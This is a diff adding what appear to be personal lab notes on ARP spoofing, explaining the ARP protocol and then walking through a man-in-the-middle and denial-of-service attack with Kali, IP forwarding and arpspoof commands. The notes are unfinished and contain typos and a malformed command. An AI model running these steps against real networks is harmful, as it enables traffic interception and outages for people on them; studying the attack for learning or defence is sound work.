@@ -1,0 +1,69 @@
+In computer networking, ARP spoofing (also ARP cache poisoning or ARP poison routing) is a technique 
+by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area 
+network. Generally, the aim is to associate the attacker's MAC address with the IP address of 
+another host, such as the default gateway, causing any traffic meant for that IP address to be sent 
+to the attacker instead.
+
+ARP spoofing may allow an attacker to intercept data frames on a network, modify the traffic, or stop 
+all traffic. Often the attack is used as an opening for other attacks, such as denial of service, 
+man in the middle, or session hijacking attacks.
+
+The attack can only be used on networks that use ARP, and requires that the attacker has direct access 
+to the local network segment to be attacked.
+
+-> About ARP protocol
+ARP protocol is used to transform IPv4 addresses to MAC Addresses.
+ARP works with request/response format.
+ARP is used on a LAN.
+
+The request is broadcasted and could be summarize by: 
+  Req:  who has <IP address>, tell <IP for response>
+  Resp: <IP address> send its own MAC address to <IP for response>
+  Then: <IP for response> srores the new couple MAC address/<IP address> in its ARP table.
+
+
+-> How to perform ARP Spoofing.
+
+0. Kali will be the MITM (Man In The Middle).
+
+1. Enable the IP forwarding on the Kali machine.
+$ sudo echo "1" > /proc/sys/net/ipv4/ip_forward
+$ cat /proc/sys/net/ipv4/ip_forward
+
+>>> The IP forwarding is now enabled on Kali.
+
+2. Find the LAN gateway and the interface on Kali.
+$ route -n
+---
+Table de routage IP du noyau
+Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
+0.0.0.0         192.168.8.1     0.0.0.0         UG    100    0        0 eth0
+---
+>>> The gateway is 192.168.8.1 (<gw IP addr>).
+>>> The interface is eth0.
+
+>>> CONTINUE HERE <<<
+
+3. Perform the attack.
+* Check the ARP table on the target:
+$ arp -a
+
+* Performs the attack on Kali:
+$ sudo arpspoof -i eth0 -t (target IP addr> -r <gw IP addr>
+
+* Check the result on the target:
+$ arp -a
+>>> all traffic now pass through the local machine.
+
+* Target:
+# sudo echo "0" > /proc/sys/net/ipv4/ip_forward
+>>> no ip forwarding anymore.
+
+??? $ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1
+
+The distance machine now suffers a DoS attack. No internet connection at all.
+
+* Local:
+Ctrl-C in arpspoof to restore the initial ARP table.
+>>> Ouf, attack ended ;) !
+
